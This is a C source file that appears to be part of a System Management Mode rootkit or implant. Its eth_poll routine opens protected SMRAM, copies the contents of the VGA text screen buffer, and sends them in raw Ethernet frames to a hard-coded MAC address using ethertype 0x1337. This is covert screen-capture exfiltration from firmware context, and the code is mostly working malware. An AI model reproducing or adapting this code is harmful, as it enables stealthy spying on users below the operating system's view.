#include <pci.h>
#include <io.h>
#include <video_defines.h>
#include <smram.h>
#include <pci-bother.h>
#include <output.h>
#include "net.h"

static struct nic *_nic = 0x0;

extern struct pci_driver a3c90x_driver;

static char test[1024] = {0};

static unsigned char vga_read(unsigned char idx)
{
	outb(CRTC_IDX_REG, idx);
	return inb(CRTC_DATA_REG);
}

static unsigned int vga_base()
{
	return (((unsigned int) vga_read(CRTC_START_ADDR_MSB_IDX)) << 9)
	     + (((unsigned int) vga_read(CRTC_START_ADDR_LSB_IDX)) << 1);
}

void eth_poll()
{
	int i;
//	static int c;
	static short pos = 0x0;
	unsigned short base = vga_base();
	unsigned char *p = (unsigned char *)0xB8000;
	smram_state_t old_state;
	
	if (!_nic)
		return;

	_nic->poll(_nic, 0);
	smram_tseg_set_state(SMRAM_TSEG_OPEN);
	old_state = smram_save_state();
	
//	if ((c++) % 2)
//		return;
	
	test[0] = pos >> 8;
	test[1] = pos & 0xFF;
	test[2] = base >> 8;
	test[3] = base & 0xFF;

	smram_aseg_set_state(SMRAM_ASEG_SMMCODE);
	
	for (i = 4; i < 1024; i++)
	{
		test[i] = p[pos++];
		pos %= 0x8000;
	}
	smram_restore_state(old_state);
	_nic->transmit("\x00\x03\x93\x87\x84\x8C", 0x1337, 1024, test);
}

int eth_register(struct nic *nic)
{
	if (_nic)
		return -1;
	_nic = nic;
	return 0;
}

void eth_init()
{
	/* Required for DMA to work. :( */
	smram_tseg_set_state(SMRAM_TSEG_OPEN);
	pci_probe_driver(a3c90x_driver);
}
